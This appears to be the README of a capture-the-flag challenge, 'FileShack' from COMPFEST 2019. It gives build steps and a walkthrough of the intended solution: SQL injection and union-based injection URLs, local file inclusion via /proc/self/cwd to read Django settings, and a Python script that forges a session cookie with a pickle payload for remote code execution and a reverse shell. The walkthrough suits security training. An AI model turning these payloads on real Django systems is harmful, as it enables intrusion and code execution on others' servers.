# FileShack CTF Challenge (COMPFEST 2019 CTF Quals)

## Build & Run

```bash
# Build environment with flag
docker-compose build --build-arg flag=COMPFEST{flag} --build-arg flag_path=/change_this

# Run environment
docker-compose up -d

# Populate database (do it only once during first run)
docker-compose run web python manage.py migrate
docker-compose run web python manage.py populate_db
```

## Testing

http://127.0.0.1:8000

## Description

```
We build a repository for secret files with modern web framework. *URL*
```

## Intended Solution

1. SQL injection on `/file/[TOKEN]`.

```
http://127.0.0.1:8000/file/df89182c50e0a62779b3d6a741951862807a4f3a%22%20--%20asdf
```

2. Enumeration via blind SQL injection to determine `fileboard_file` table structure and web framework (there are some tables with `django` prefix).

3. Union-based SQL injection to determine the column of file name.

```
http://127.0.0.1:8000/file/df89182c50e0a62779b3d6a741951862807a4f3a%22%20union%20select%201,2,%22dummy.pdf%22%20--%20asdf
```

4. LFI without `/` in the file path.

```
http://127.0.0.1:8000/file/df89182c50e0a62779b3d6a741951862807a4f3a%22%20union%20select%201,2,concat('..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'proc',%20CHAR(47),%20'self',%20CHAR(47),%20'cwd',CHAR(47),'manage.py')%20--%20asd
```

5. Load `manage.py` with LFI via `/proc/self/cwd` to know the application directory name (`FileShack`).

```
http://127.0.0.1:8000/file/df89182c50e0a62779b3d6a741951862807a4f3a%22%20union%20select%201,2,concat('..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'proc',%20CHAR(47),%20'self',%20CHAR(47),%20'cwd',CHAR(47),'manage.py')%20--%20asd
```

6. Load `settings.py` to know `SECRET_KEY`, `SESSION_ENGINE` (`django.contrib.sessions.backends.signed_cookies`), and `SESSION_SERIALIZER` (`django.contrib.sessions.serializers.PickleSerializer`).

```
http://127.0.0.1:8000/file/df89182c50e0a62779b3d6a741951862807a4f3a%22%20union%20select%201,2,concat('..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'..',%20CHAR(47),%20'proc',%20CHAR(47),%20'self',%20CHAR(47),%20'cwd',CHAR(47),'FileShack',CHAR(47),'settings.py')%20--%20asd
```

7. Forge `sessionid` cookie with `SECRET_KEY` to trigger blind RCE through Django `PickleSerializer` insecure deserialization.

```python
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
from django.conf import settings

settings.configure(SECRET_KEY='SECRET_KEY')


class Payload(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.call, (['python', '-c', 'REVERSE_SHELL_PAYLOAD;'],))

sessionid = signing.dumps(
    obj=Payload(),
    serializer=PickleSerializer,
    salt='django.contrib.sessions.backends.signed_cookies'
)

print(sessionid)
```
